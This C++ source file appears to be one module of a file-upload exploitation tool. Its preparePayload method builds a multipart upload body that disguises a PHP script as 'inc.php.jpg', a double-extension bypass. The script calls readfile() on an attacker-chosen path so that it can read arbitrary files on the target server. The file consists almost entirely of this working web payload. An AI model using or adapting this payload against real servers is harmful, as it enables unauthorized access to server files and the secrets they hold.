#include "StrategyDoubleExt.hpp"
using namespace std;

StrategyDoubleExt::StrategyDoubleExt()
{

}

string StrategyDoubleExt::preparePayload(string str)
{
	return "-----------------------------93498294572740123492192846\r\nContent-Disposition: form-data; name=\"file\"; filename=\"inc.php.jpg\"\r\nContent-Type: application/x-php\r\n\r\n<?php\nreadfile('"+str+"');\n?>\r\n-----------------------------93498294572740123492192846--\r\n";
}
